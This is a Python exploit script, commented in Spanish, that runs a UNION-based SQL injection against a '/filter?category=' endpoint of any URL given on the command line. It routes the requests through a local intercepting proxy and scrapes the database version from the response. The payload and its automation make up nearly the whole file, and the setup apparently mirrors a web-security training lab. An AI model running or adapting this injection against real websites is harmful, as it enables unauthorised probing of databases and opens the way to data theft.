import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

# Desactivar advertencias de certificados SSL no verificados para evitar salida excesiva en consola
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurar proxies
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_sql_version(url):
    # Definir el Path y el payload específico para el ataque SQL
    path = '/filter?category=Pets'
    sql_payload = "' UNION select @@version,NULL%23"

    # Realizar la solicitud, desactivando la verificación SSL y usando los proxies definidos
    r = requests.get(f"{url}{path}{sql_payload}", verify=False, proxies=proxies)
    res = r.text
    print(res)

    # Analizar la respuesta HTML
    soup = BeautifulSoup(res, 'html.parser')
    patron_version = re.compile(r'\d+\.\d+\.\d+(?:-\w+)*')  # Patrón para identificar versiones

    # Buscar la versión de la base de datos en todas las etiquetas <th>
    for th in soup.find_all('th'):
        found = patron_version.search(th.text)
        if found:
            version_base_datos = found.group()
            print(f"[+] La versión de la base de datos es: {version_base_datos}")
            return version_base_datos

    # Si se llega a este punto, no se encontró la versión
    return None

def main():
    # Verificar que se ha proporcionado una URL como argumento
    if len(sys.argv) < 2:
        print(f"[-] Uso: {sys.argv[0]} <url>")
        print(f"[-] Ejemplo: {sys.argv[0]} www.ejemplo.com")
        return  # Salir si no se proporciona la URL

    # Obtener la URL desde la línea de comandos
    url = sys.argv[1].strip()

    # Llamar a la función de explotación y manejar el resultado
    if not exploit_sql_version(url):
        print("[-] No se encontró la versión de la base de datos")

if __name__ == "__main__":
    main()